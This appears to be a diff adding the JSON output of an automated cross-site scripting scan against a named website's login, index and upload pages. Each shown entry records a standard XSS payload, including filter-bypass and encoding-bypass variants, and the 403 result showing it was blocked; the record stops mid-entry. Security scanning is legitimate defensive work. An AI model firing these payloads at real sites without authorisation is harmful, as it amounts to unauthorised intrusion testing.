@@ -1,0 +1,2651 @@
+{
+  "scan_info": {
+    "target_url": "http://healthmash.net/",
+    "scan_date": "2025-11-21T17:59:14.571847",
+    "total_tests": 264,
+    "vulnerabilities_found": 0
+  },
+  "vulnerabilities": [],
+  "all_test_results": [
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.072385"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<img src=x onerror=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.083175"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<svg onload=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.092693"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "\"><script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.103706"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "';alert(1);//",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.115024"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<img src=x onerror=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.126884"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<body onload=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.138015"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.148724"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<input onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.159955"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<select onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.171588"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<textarea onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.182819"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<keygen onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.192940"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.203599"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.214935"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<details open ontoggle=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.226123"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.236893"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(1)</script>",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.249091"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.260268"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.272679"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert`1`</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.284311"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(/XSS/)</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.298808"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.310215"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.321466"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<img src=x onerror=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.333125"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<svg onload=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.343249"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "\"><script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.355103"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "';alert(1);//",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.366326"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<img src=x onerror=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.377300"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<body onload=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.388415"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.399098"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<input onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.410253"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<select onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.420806"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<textarea onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.432013"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<keygen onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.443243"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.454775"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.465317"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<details open ontoggle=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.476596"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.487540"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(1)</script>",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.498900"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.509986"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.521459"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert`1`</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.532795"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(/XSS/)</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.544134"
+    },
+    {
+      "url": "http://healthmash.net/login.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:56.555549"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.063309"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<img src=x onerror=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.073203"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<svg onload=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.084401"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "\"><script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.095388"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "';alert(1);//",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.105226"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<img src=x onerror=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.116797"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<body onload=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.127480"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.140143"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<input onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.151502"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<select onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.163307"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<textarea onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.173890"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<keygen onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.185309"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.195783"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.207533"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<details open ontoggle=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.218914"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.230053"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(1)</script>",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.242626"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.254653"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.266171"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert`1`</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.277508"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(/XSS/)</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.288119"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.299687"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.311548"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<img src=x onerror=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.332715"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<svg onload=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.345251"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "\"><script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.357562"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "';alert(1);//",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.368939"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<img src=x onerror=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.380790"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<body onload=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.392339"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.404394"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<input onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.415651"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<select onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.427916"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<textarea onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.440926"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<keygen onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.452225"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.463551"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.475672"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<details open ontoggle=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.487969"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.499147"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(1)</script>",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.510472"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.521749"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.532252"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert`1`</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.544702"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(/XSS/)</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.556989"
+    },
+    {
+      "url": "http://healthmash.net/index.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:58:59.569400"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.379299"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<img src=x onerror=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.391015"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<svg onload=alert(1)>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.402570"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "\"><script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.415173"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "';alert(1);//",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.427143"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<img src=x onerror=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.439448"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<body onload=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.452100"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<iframe src=\"javascript:alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.464209"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<input onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.476759"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<select onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.490230"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<textarea onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.503336"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<keygen onfocus=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.516552"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<video><source onerror=\"alert(1)\">",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.530271"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.543404"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<details open ontoggle=alert(1)>",
+      "category": "advanced",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.560917"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.574522"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(1)</script>",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.587609"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+      "category": "encoding_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.600844"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.613656"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert`1`</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.626890"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(/XSS/)</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.639858"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "username",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "category": "filter_bypass",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.652431"
+    },
+    {
+      "url": "http://healthmash.net/upload.php",
+      "method": "post",
+      "parameter": "password",
+      "payload": "<script>alert(1)</script>",
+      "category": "basic",
+      "vulnerable": false,
+      "response_code": 403,
+      "timestamp": "2025-11-21T17:59:02.664735"
+    },
+    {
